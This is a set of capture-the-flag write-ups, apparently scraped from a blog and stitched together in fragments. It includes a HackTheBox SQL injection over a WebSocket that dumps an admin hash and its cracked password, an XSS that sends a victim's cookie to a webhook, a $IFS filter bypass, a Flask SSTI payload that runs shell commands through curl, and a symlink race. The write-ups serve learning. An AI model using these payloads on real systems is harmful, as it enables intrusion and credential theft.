Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Mar 25 21:07:29 2023 -- 1 IP address (1 host up) scanned in 92.72 seconds We can see from Server: Python/3.10 websockets/10.4, that this unusual port is an open web socket. We will come back to this later.\nExamining the webpage Trying to visit the box\u0026rsquo;s ip address as 10.10.11.206 redirects us to qreader.htb. To properly visit the webpage that should be visible on port 80, we must add the address to our /etc/hosts file:\n1 $ echo \u0026#34;10.10.11.206 qreader.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Now the website is viewable.\nWe see the website advertised as a QR code reader:\nWe can test it out within the browser, or they allow us to download an offline version further below. There are options for windows or linux versions. Being on linux, I will use this version for now and hope there is no significant difference between the two.\n1 2 $ file QReader_lin_v0.0.2.zip QReader_lin_v0.0.2.zip: Zip archive data, at least v1.0 to extract, compression method=store Analyzing the QR Code Reader The zip contains an ELF binary for the QR code reader and a test.png to try it out\nAfter translating test.png it returns the box creator\u0026rsquo;s username. Nice touch. Selecting the about tab, and trying to get info on either the version or updates will return this Connection error message. What could it be connecting to, perhaps our box\u0026rsquo;s WebSocket port? Since the box itself is created and tested with static IP addresses, it isn\u0026rsquo;t unreasonable to believe that when the box is moved to live environments with the hosting IP address constantly changing, that connection attempts like this one might fail.\nWith the app open, I monitored the packet traffic data using tcpdump:\n1 2 3 4 5 6 7 8 $ sudo tcpdump tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes \u0026lt;...SNIP...\u0026gt; 20:04:21.317409 IP 10.0.2.15.53274 \u0026gt; 108-166-149-2.client.mchsi.com.domain: 56266+ A? ws.qreader.htb.

I had heard the data can be retrieved through decompiling the binary file, but this is beyond my skill at the time.\nExamining the exposed WebSocket Interacting with web sockets can be tricky. There are a variety of ways to do it, but I chose to utilize a Simple WebSocket Client Plugin for FireFox. Loading the page, we can input our url as ws://10.10.11.206:5789\nFortunately for us, it looks as though an improper input provides us with a small list of options on how we might interact. Since the output was JSON format, it is likely that the input must be JSON as well. After exploring for a bit, I find another response when probing ws://10.10.11.206:5789/update\nIt was a bit of a lucky hit that any version not 0.0.2 will return a message like this, otherwise it could be more difficult finding the version naming conventions in use. Now returning to /version, I check what happens when I input the older version 0.0.1:\nThere doesn\u0026rsquo;t seem to be any extra information leaked through these queries. Upon closer inspection, however, we can eventually discover that these /version queries are SQL injectable.\nNote that despite supplying the invalid version, we still receive the confirmation of version 0.0.2. From here, we should be able to leak the database information.\nFoothold Manual enumeration with SQLi UNION injections Eventually I find that the database is sqlite through the query UNION SELECT sql from sqlite_master:\n1 2 3 {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} Note that this type of sql injection often depends on having the same number of columns as the usual output. Since typically this websocket is expected to provide 4 columns (id, version, release_date and downloads), I supplement my union injection with 3 columns of NULL.\nThis first output shows a table called versions, which is likely what we are already getting from non-injected queries. Dumping all tables might be slow this way, but we can do so by supplying LIMIT to our query:\nNote that in this query I use tbl_name, so that the output isn\u0026rsquo;t so long. Using sql provides us information on all column names from within the table, so it is useful to use once we find an interesting table. For a better word-wrapping experience, from this point on I put all outputs in code brackets\nAfter dumping all tables, we see a full picture that looks like this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 1-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT, answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id))\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 2-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE info (id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT, value TEXT)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 3-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE reports (id INTEGER PRIMARY KEY AUTOINCREMENT, reporter_name TEXT, subject TEXT, description TEXT, reported_date DATE)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 4-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE sqlite_sequence(name,seq)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 5-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password DATE, role TEXT)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 6-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} Users database is a clear standout, and may contain valuable credentials:\n1 2 3 4 5 6 7 8 9 10 11 12 {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT username,password,role,NULL FROM users where id = 1-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;0c090c365fa0559b151a43e0fea39710\u0026#34;, \u0026#34;released_date\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT username,password,role,NULL FROM users where id = 2-- -\u0026#34;} {\u0026#34;message\u0026#34;: \u0026#34;Invalid version!\u0026#34;} After dumping credentials for admin, there are no other entries in the table.

This can give us potential ideas as to what username(s) might be on the machine.\nBonus: using SQLMap to dump the database Because the SQL injection is done through a WebSocket interaction, utilizing SQLMap is a little more complex than usual. Although SQLMap has WebSocket compatibility, it has been difficult to properly launch in my experience. However, there is a nice blog article that highlights a clever approach to using sqlmap over a WebSocket. In this approach, the author sets up a python server script that will receive SQLMap\u0026rsquo;s queries, transform the payload to a relevant JSON query, then redirect it to the WebSocket of interest.\nFirst, the python redirection script needs to be updated to our situation. The ws_server value must be changed, and also the payload replace line must be altered.

If the SQLi type had been a blind injection, enumerating everything by hand can be extremely time consuming. It is good to know how we might make automation for this task possible.\nAuthenticating through ssh With exploration of the database finished, we can finally move on to the obtained Administrator credentials. Since it is information stored in the sqlite table, it is highly likely to be a password hash. Fortunately enough, we don\u0026rsquo;t even have to crack it ourselves. A quick trip over to crackstation, and we get the plaintext password immediately.\nWe now have creds as Admin:denjanjade122566\nTrying to log in through ssh:\n1 2 3 $ ssh admin@qreader.htb admin@qreader.htb\u0026#39;s password: Permission denied, please try again.

Pyinstaller is used to compile easily-launchable binary files from python code. In this situation, pyinstaller is used so that the QReader code, written in python, can exist in a single executable for users to download. Pyinstaller compiling can be well customized through use of .spec files, which it uses to determine how to process your python script. More info can be found [here]](https://pyinstaller.org/en/stable/spec-files.html). Since we are running pyinstaller as root, perhaps we can define in the .spec file for root to do other actions.\nUsing the make script to produce a .spec template For testing around, I used a python rev shell script.

The SQLi vulnerability can be easily missed, and without extra help, SQLMap can give a lot of problems as well.

Though I did not personally solve all of them myself I will cover the related challenges solved by teammates as well.\nWhat\u0026rsquo;s for Dinner? Jonah Explorer, world renowned, recently landed in the city of Chicago, so you fly there to try and catch him. He was spotted at a joyful Italian restaurant in West Loop. You miss him narrowly but find out that he uses a well known social network and and loves documenting his travels and reviewing his food. Find his online profile.\nWith this prompt, we are informed of Jonah enjoying an italian dinner within a small subsection of Chicago. Given this information, I began sifting through all italian restaurants within that zone looking for a recent review or posting by our Jonah. After searching for hours, my fellow colleague managed to find a twitter account belonging to him. Surprisingly enough, Jonah had zero tweets announcing his dinner or even mentioning the place in Chicago. I still don\u0026rsquo;t know where he ate. His only tweet is one containing the flag. uiuctf{i_like_spaghetti}\nFinding Jonah? Jonah offered a reward to whoever can find out what hotel he is staying in. Based on the past information (chals), can you find out what the hotel he stayed at was? Flag should be uiuctf{hotel_name_inn}\nProvided image:\nWe can see two rather tall buildings, with the left one having more identifiable features in a curved top shape. Perusing the tallest buildings in chicago we can identify it fairly quickly as River Point, located at 444 West Lake Street. We know we are looking at a hotel, so from here we can try to guess the hotel location based on the angle of the building, and the relative sizes of the nearby buildings. Eventually we land on a successful guess of uiuctf{hampton_inn}. The inn can be found at this location\nJonah\u0026rsquo;s Journal After dinner, Jonah took notes into an online notebook and pushed his changes there. His usernames have been relatively consistent but what country is he going to next? Flag should be in format uiuctf{country_name}\nThis challenge is dependent on solving What's For Dinner?, as this one contains the key info of account username. There are several online notetaking services, but the language here is a strong suggestion on where it might be. It states that jonah \u0026ldquo;pushed his changes there\u0026rdquo;. The reference here is likely to a git push, which is the method to submit changes on git based services such as github. Searching here we can see right away, https://github.com/jonahexplorer. There is exactly 1 public repo on this account, and in it he states the following:\n1 2 3 storing all my adventure codes I think that the next place I wanna visit is the great wall of china, but not until I get off of flight UA5040 And so, we have our answer. uiuctf{china}.\nFirst class mail Jonah posted a picture online with random things on a table. Can you find out what zip code he is located in? Flag format should be uiuctf{zipcode}, ex: uiuctf{12345}.\nProvided image:\nThe image contains a lot of items, but only a couple stand out as interesting. The first being an insurance letter with the return address in plain sight. Trying uiuctf{16530} did not pass, so this address is not it. The other letter, however, has the mail address hidden but the mail barcode is shown in plain sight. Intelligent Mail Barcodes are used by the USPS to sort mail delivery quickly and easily. If we can decode this, we might be able to learn Jonah\u0026rsquo;s zip code. We can convert the barcode using this decoder key, then submitting it to an online decoder tool:\nDecoding our letter: FDFFDDFFDDDDFFDDDFFDDDDDFFDDDFFDDDFFDDFDFDDFFDDFDDFF\nUsing dcode.fr to decode:\nWe see the 9-digit zip as 606611234. This is known as ZIP+4, as the last 4 digits are extra specifiers to pinpoint a subsection within a regular ZIP address. The flag is only asking for the zip address with an example of 5 digits, so we submit the ZIP without the +4 appended: uiuctf{60661}.\n","date":"2023-07-03T11:37:04-05:00","permalink":"https://yuwenmichael.netlify.app/post/uiuctf_2023/","title":"UIUCTF_2023"},{"content":"Warmup Fast Hands Author: @JohnHammond#6971\nYou can capture the flag, but you gotta be fast!\nWe are given a button to Capture The Flag:\nClicking the button opens a new window that closes rather abruptly.

Checking the source code with ctrl+U is an absolute mess. However, since everything I interact with does not take me anywhere new, I want to view html code on the page. Using right click to inspect has an interesting interaction:\nWhat\u0026rsquo;s even more interesting is this does nothing.

I learned the proper syntax that should work for testing purposes, but nothing connects back:\n1 2 3 4 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) Say \u0026#34;Test\u0026#34; client_loop: send disconnect: Broken pipe After trying things for quite a while, right before giving up, I miraculously stumbled upon a response somehow:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) \u0026#39;say test\u0026#39; ; run \u0026#39;say test\u0026#39;; Say \u0026#34;Test\u0026#34;; exec run ; go ^F mysh: say: not found ^Fmy my sh: RUN: not found sh: say: not found Test sh: EXEC: not found sh: RUN: not found Ssh: GO: not found Connection to challenge.nahamcon.com closed. While just enough to keep me from giving up, I had a lot of trouble recreating this still. While I had pressed ^F in the cli, I was under the impression that I also had pressed ^D and this keystroke was important for the execution. However, simply pressing ^D on its own ended up terminating the ssh connection.\nEventually I landed on a goofy pattern to execute, where I write my commands, quickly press the enter key two times, immediately followed by ^D, then another enter stroke. With this, my commands would be executed and then the connection terminated.\n1 2 3 4 5 6 7 8 9 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) ADDRESS SYSTEM \u0026#34;ls\u0026#34; Say \u0026#34;Test\u0026#34; flag.txt Test Connection to challenge.nahamcon.com closed. 1 2 3 4 5 6 7 8 9 10 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) ADDRESS SYSTEM \u0026#34;cat flag.txt\u0026#34; Say \u0026#34;Test\u0026#34; flag{2459b9ae7c704979948318cd2f47dfd6} Test Connection to challenge.nahamcon.com closed. CTRL+D is commonly used for exiting programs, so it is somewhat sensible that it finalizes REXX-Regina for execution. Was this intended, though? It certainly felt like a strange way to interact.\nMisc Goose Chase Author: @JohnHammond#6971\nI am truly sorry. I really do apologize\u0026hellip; I hope you can bear with me as I set you all loose together, on a communal collaboriative wild goose chase.\nWithin the google sheet, we see a hidden sheet if we check the bottom left:\nIt seems there is no way to view this as long as it is owned by somebody else, but it is possible to clone it into my own google sheet:\nUnder our copied version, we can make the hidden sheet viewable. Within the hidden sheet seems to be a formula importing from another sheet, only viewable after turning on formulas (View -\u0026gt; Show -\u0026gt; Formulas).\nFollowing this page again looks like an empty sheet. Just to be sure, i exported the sheet to a csv. Without editing the saved file, I learned that the flag was present in the file name:\n1 Goose Chase - Google Sheets - ... - Google Sheets - ... flag{323264294cc2a4ebb2c8d5f9e0afb0f7} - Google Sheets - Goose Chase.csv It isn\u0026rsquo;t obvious until I had exported, but it appears the flag was buried deep within the title name of the second sheet project. This can be verified using browser view, the flag is also present on hovering over the window:\nflag{323264294cc2a4ebb2c8d5f9e0afb0f7}\nOne Zero Author: @JohnHammond#6971\nYou only get one zero. ;)\nNOTE, This solution utilizes an unintended interaction.\nWe are given a file to see the restrictions placed.

Next I found that I can append letter characters after a zero, and I still bypass the allowlist:\n1 2 user@one_zero:~$ 0whoami bash: 0whoami: command not found So far nothing is workable. After attempting some other additional operators:\n1 2 3 user@one_zero:~$ 0||whoami bash: 0: command not found Sorry, you used a character that is not in the allowlist! My operators are not exactly blacklisted, but being 2 separate commands still goes through the allowlist check, which my whoami inevitably fails.\nI know the bash special variable $IFS is known to be rather effective at bypassing some tricky filter settings, so I decided to try it out here and see what happens:\n1 2 3 4 user@one_zero:~$ ${IFS}whoami user user@one_zero:~$ ${IFS}ls flag.txt In an unexpected twist, it appears using $IFS at the start of the command results in any subsequent input bypassing the filter!

If one sudo process is immediately sent to bg, it will fail to launch once i try to fg, since the password had not really been submitted.\nAfter spending too long on trying to run 2 processes simultaneously, I looked more thoroughly at the userinput we could control.

Also notable is the tail -f . The -f flag is a live following, or reading the final lines of the file. We can also see a trailing \u0026amp;, meaning this has been set to background.

Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nFirst challenge places us on a golf course, at some kind of ceremony/speech. The first object of interest is the large event banner, containing the phrase \u0026ldquo;all Thailand Premier Championship\u0026rdquo;. There is more text, Road to (something), that I was unable to accurately read.\nSearching for all Thailand, we quickly see a webpage for a golf tour org. It seems like the right track. One common word that I found appearing was Singha, which might be matching in our image\u0026rsquo;s banner: \u0026ldquo;Road to Singha (something)\u0026rdquo;. The final word was still not readable for me, but this is enough to go on. Searching the golf tour website, I found all Thailand Premier Championship - Road to Singha Masters located on the media page. Following the link takes us to a video, and right away in the video we are given a location\u0026ndash;Singha Park in Khon Kaen.\nI found the tolerance to be rather strict, so I ended up locating the same exact capture on Google Maps as well.\nFinally with the pinpointed location, we get the flag.\nflag{3e3d01a002db29fec2a5e10ec758b852}\nChall2 Author: @Gary#4657\nHead over to https://osint.golf and select chall2 under the NahamCon2023 category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nNOTE: The integrated compass direction is inconsistent with the actual panorama representation.\nThe second challenge places us on a large boat near a dock, with vehicles on it. Unfortunately, boats very commonly travel internationally, so things such as language/flags on the boat may not give us interesting information. The land appears to have some unusual architecture, so I decided to screencap this region and see what a google image search can give me.\nVery quickly I find a very similar capture, labeling it Napoleon\u0026rsquo;s Elba Hideaway. The article notes that this location is in Portoferraio, Italy.\nOnce again, the pointing at the dock itself is not specific enough. After a bit more trial and error, I find the exact location:\nflag{e54fcc18854f0adfdedf22120c346b3a}\nChall3 Author: @Gary#4657\nHead over to https://osint.golf and select chall3 under the NahamCon2023 category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nWe are now in a park. Notably, there are large buildings on all sides of the park. We must be in not only a major city, but a city with a sizeable space dedicated to a grassy open park. My first inclination is New York City with its quite sizeable Central Park. Checking the terrain map, the Sheep Meadow location is a wide grassy area. I look for a street view and know right away that this is a match. From chall3:\nFrom Sheep Meadow street view:\nOnce again, finding the same view location as the challenge:\nflag{aa1b04ee3ded3a7c3ee16be1ff85e99c}\nChall4 Author: @Gary#4657\nHead over to https://osint.golf and select chall4 under the NahamCon2023 category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nNOTE: The integrated compass direction is inconsistent with the actual panorama representation.\nIn the final Geosint challenge, we are given a drone shot of what seems to be a suburban area setting. We are too far away do identify anything such as the language on signs or country flags, but we can note the very large number of train track lanes. Some buildings in the distance appear to have uncommon architecture, but not enough for me to draw any conclusions. My first guess is to take the most eye-catching building and see what image searches can do for me.\nFrom this image, it was quickly identified as Bratislava Castle of Bratislava, Slovakia. This location does not match geographically, but the building\u0026rsquo;s design and colors match very well. The second building I searched for is the neighboring church-like building.\nThere were several identical matches for seemingly different buildings. However, one in particular mentions a castle with it in combination. this web posting seems to be reviewing it as a bike trail. Examining the geography in a google map search for Schloss Ebenfurth, it instantly became clear that this is the same location as the challenge.\nI was unable to find the same capture on Google Maps, but since this is an arial view, we can get a pretty good idea where it might be without too much trouble.\nflag{2e57cfe16d7e1c5431aa3b99d0e713cb}\nWeb Hidden Figures Author: @JohnHammond#6971\nLook at this fan page I made for the Hidden Figures movie and website! Not everything is what it seems!\nEntering the website we see a pretty well-constructed page promoting Hidden Figures, a pretty popular book/movie. None of the links take us to other pages, so there is little to be explored. Early on, I noticed that folder directory /assets/ is free to view. I thought perhaps there might be something hidden here, or in another commonly used folder type?\nAfter some lengthy enumeration, I found nothing of interest.\nLooking at the page source, I noticed that there are several links with very long url codes:\n1 2 data:image/png;base64,/9j/4AAQSkZJRgABAQEBLAEsAAD/7RqcUGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAFocAVoAAxslRxwCAAACAAAcAngAFVdvbWFuIG9mIE5BU0EgTGFuZ2xleRwCVQAPRGF2aWQgQy4gQm93bWFuHAI3AAgyMDE0MDMyMBwCPAALMDkxNTA2KzAwMDA4QklNBCUAAAAAABBbRWm4H1TKYVo1ObYsy6/POEJJTQQ6AAAAAAESAAAAEAAAAAEAAAAAAAtwcmludE91dHB1dAAAAAUAAAAAUHN0U2Jvb2wBAAAAAEludGVlbnVtAAAAAEludGUAAAAASW1nIAAAAA9wcmludFNpeHRlZW5CaXRib29sAAAAAAtwcmludGVyTmFtZVRFWFQAAAAWAEUAUABTAE8ATgAgAFMAdAB5AGwAdQBzACAAUAByAG8AIAA3ADkAMAAwAAAAAAAPcHJpbnRQcm9vZlNldHVwT2JqYwAAAAwAUAByAG8AbwBmACAAUwBlAHQAdQBwAAAAAAAKcHJvb2ZTZXR1cAAAAAEAAAAAQmx0bmVudW0AAAAMYnVpbHRpblByb29mAAAADHByb29mTW9uaXRvcjhCSU0EOwAAAAACLQAAABAAAAABAAAAAAAScHJpbnRPdXRwdXRPcHRpb25zAAAAFwAAAABDcHRuYm9vbAAAAAAAQ2xicmJvb2wAAAAAAFJnc01ib29sAAAAAABDcm5DYm9vbAAAAAAAQ250Q2Jvb2wAAAAAAExibHNib29sAAAAAABOZ3R2Ym9vbAAAAAAARW1sRGJvb2wAAAAAAEludHJib29sAAAAAABCY2tnT2JqYwAAAAEAAAAAAABSR0JDAAAAAwAAAABSZCAgZG91YkBv4AAAAAAAAAAAAEdybiBkb3ViQG/gAAAAAAAAAAAAQmwgIGRvdWJAb+AAAAAAAAAAAA \u0026lt;...SNIP...\u0026gt; And so on. I didn\u0026rsquo;t know this was possible or ever really done, but it appears that some websites might provide their images in base64 encoded data like this so that images can be loaded without retrieving data from other pages. This seems to be what is going on here, as following the link takes me to an image regardless of the website\u0026rsquo;s running state.\nEventually I thought to download each of the images located on the website. While reviewing this challenge I discovered that saving the image directly is enough, but at the time I had decided to copy/paste the entire url into a file. After removing data:image/png;base64, I base64 decoded the info:\n1 $ cat url | base64 -d \u0026gt; decode_url And so on, for all 4 images found.\nChecking exiftool didn\u0026rsquo;t give me any critical information, however binwalk did show me something hidden in the figures.\n1 2 3 4 5 6 7 $ binwalk decode_url2 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 15486 0x3C7E PNG image, 1851 x 174, 8-bit/color RGB, non-interlaced 15527 0x3CA7 Zlib compressed data, default compression There is another image hidden here, and potentially some compressed data?

After trying and failing a few easy guesses like admin:admin, I made my own account with username asdf.

And so, when a victim views this page, the image will attempt to be loaded by visiting my webhook. The webhook will log the request information and with it, I will be able to see whatever cookies are associated with the victim\u0026rsquo;s session.\nIndeed we see a cookie: x-wing=eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZIvRmQ.20AcIM9F-Kg8q21j8Pc4mVl2aO0\nBy substituting our X-wing cookie for this one, we become admin.

Once I asked him the wifi password he gave me some numbers like 186808155710 and told me that the number are in group of two like 1008 -\u0026gt; 10 and 08/8. Can you help to gather the wifi password? (Note: It forms a complete word, so you might have to leave out something).\nFlag format: n00bz{the_password_in_lower_case} Author: noob_abhinav\nBased on the description, this password is likely linked to periodic table elements. We are also told that the password represents a real word, so the element letters might not exactly translate to the answer.\nFrom 186808155710 we can separate into elements: 18 68 08 15 57 10 Using periodic table, element letters are as follows: ar er o p la ne indeed areroplane doesn\u0026rsquo;t work, however this looks similar to the word aeroplane.

Also note that flag is case sensitive! Note: Due to a quite big range of answers, to narrow down your search, use the latitude and longitude provided from this site: blog.jatan.space This presented image appears to be a 3D rendering of a moon landing plan. The first easy check to be done is a reverse image search in google, and see what articles are discussing this event. Very quickly I see an article that uses the image discussing a failed landing for India\u0026rsquo;s moon mission titled Chandrayaan 2. The lander for this mission appears to be called Vikram, and the rover called Pragyan. This info is part of the flag, but we still need to find the exact coordinates of the planned landing. With a mission name in mind, I visited the blog.jatan.space site mentioned, and searched for Chandrayaan 2. On this page I learned the coordinates planned for the landing: 70.9S, 22.8E.\nNow we can construct and submit the flag as n00bz{Vikram_Pragyan_70.9_22.8}.\nTry to hack me My friend brayannoob gave me a ctf challenge and told me Try to hack me.\nA google search on brayannoob did not yield any interesting results, so I decided to switch search engines. Upon using Bing, a github account was among the first results, very interesting. The repositories within this github we see a n00bzCTF-2022 writeup. With relevance on our side, this is clearly related to the challenge. Exploring the newest repository, BrayanResearch, I uncovered user credentials from an older edit of the README.md file:\n1 2 3 4 \u0026lt;!-- ACCOUNT CREDENTIALS --\u0026gt;| \u0026lt;!-- USERNAME - @brayanduarte.noob --\u0026gt;| \u0026lt;!-- PASSWORD - Brayann00b@2023 --\u0026gt; # THANK YOU :love: Other edits also give light to potential usernames:\n1 \u0026lt;!-- username : @brayan24 --\u0026gt; and in the current readme:\n1 \u0026lt;!-- username : brayan234 --\u0026gt; We have potential usernames and a password, but which service these are for? It is not so clear.\nThis github repo supplies a demo, providing a link to replit.com. After searching for a little bit, we come across this user.. Using the provided password, I was able to log in and \u0026ldquo;hack\u0026rdquo; this account! However, after searching for quite some time, I was unable to find the flag. Reviewing the CTF discord channel, there is an announcement that breaching this account was unintended for the challenge. I suppose this little adventure may serve to emphasize how easy it might be to accidentally leak credentials on github or other services!\nFrom the discord message we know the password login is irrelevant, time to think on the hints provided in the prompt again. Looking at the Try to hack me part, it makes me think of the popular web service TryHackMe. After looking through usernames we stumble upon a certain username from our list: brayan234. Looking at this account, it appears we didn\u0026rsquo;t need to log in at all!

These are common python functions, suggesting a python code injection. Exploring where our input is used, we have this line:\n1 render_template_string(f\u0026#39;\u0026lt;p\u0026gt;Haha! No certificate for {name}\u0026lt;/p\u0026gt;\u0026#39;) A very quick google search suggests this might be SSTI, which is reasonable to believe based on the blacklist. We must utilize SSTI to display the contents of flag.txt. Among the commonly used SSTI functions present within the blacklist, we even see flag.txt is among them.\nBypassing blacklist It is clear that this blacklist must be bypassed. One possible approach is to use quotations to break string sequences. Onsra03 proposes {{namespace['__ini''t__']['__global''s__']['o''s']['pop''en']('l\\s')['rea''d'](+)}}. However, with this we quickly approach the 70 char limit.\nFrom the source code it is worth pointing out that only the parameter name is checked for blacklisted characters. If we can supply blacklisted characters in team_name\u0026ndash; or perhaps an unused parameter\u0026ndash;then call team_name again within name, we should be able to pass the blacklisted characters to execute.\nBuilding payload Using global variable g, we can generate a much smaller payload from namespace[__ini''t__]. Secondly, we can utilize request.form to reference a different supplied parameter containing banned strings. At this point, our payload is small enough that referencing team_name is still within the length requirements. However, we could make the name parameter even smaller by referencing some single letter parameter such as a:\n1 name={{g.pop[\u0026#39;__global\u0026#39;\u0026#39;s__\u0026#39;].__builtins__.eval(request.form.team_name)}}\u0026amp;team_name=__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read() Supplying this as the post request body:\n1 2 curl -X POST http://challs.n00bzunit3d.xyz:52130/generate -d \u0026#34;name={{g.pop[\u0026#39;__global\u0026#39;\u0026#39;s__\u0026#39;].__builtins__.eval(request.form.team_name)}}\u0026amp;team_name=__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read()\u0026#34; \u0026lt;p\u0026gt;Haha! No certificate for n00bz{5571_57r1k3s_4g41n_7a1b3f4e5d}\u0026lt;/p\u0026gt; Alternative payload Another interesting approach does not use g.pop but instead utilizes Flask\u0026rsquo;s get_flashed_messages function:\n1 name={{get_flashed_messages[\u0026#39;__built\u0026#39;\u0026#39;ins__\u0026#39;].eval(request.values[\u0026#39;a\u0026#39;])}}\u0026amp;a=__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read()\u0026amp;team_name=b Note that in this situation referencing team_name in request.values will exceed the input length limit, so we utilize a single letter parameter a instead. The values for team_name doesn\u0026rsquo;t matter anymore, so it\u0026rsquo;s just set to b.\n","date":"2023-06-14T20:25:09-05:00","permalink":"https://yuwenmichael.netlify.app/post/n00bzctf_2023/","title":"N00bzCTF_2023"},{"content":"Binary Exploitation tic-tac Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it. ssh to saturn.picoctf.net:62983, and run the binary named \u0026ldquo;txtreader\u0026rdquo; once connected.

If we are allowed to view, it will read the file contents. It\u0026rsquo;s also worth noting that txtreader has SUID bit set, allowing it to run as root when we use:\n1 2 $ ls -l txtreader -rwsr-xr-x 1 root root 19016 Mar 16 02:28 txtreader If we can send the textreader to open a file we have permissions on, then quickly swap it with a file linked to the flag, we should be able to trick the program into reading the flag contents for us. This is known as a Race Condition, or TOCTOU type of problem. This video by John Hammond covers a similar CTF challenge, and the solution can be done with the same approach. 1. We will create our own file called link with touch, that we can read/write to. 2. We will start txtreader, and tell it to read link, which is owned by us. 3. txtreader will check the file, and confirm we have permission to read the file 4. We will delete link, and create a new link file that is symlinked to flag.txt. Now when things want to interact with link, they are pointed to flag.txt 5. txtreader will attempt to read link, except it now points to flag.txt. Since it already confirmed we have permissions, it will output the contents of flag.txt Since txtreader won\u0026rsquo;t be waiting for us to manipulate the files in between actions, we have to be very fast, hence the race aspect. Our human action speeds aren\u0026rsquo;t nearly good enough, so what we can do is loop the action of swapping link , while also looping the run of txtreader. After enough runs, hopefully our action timings will line up and we can get the flag. Making the 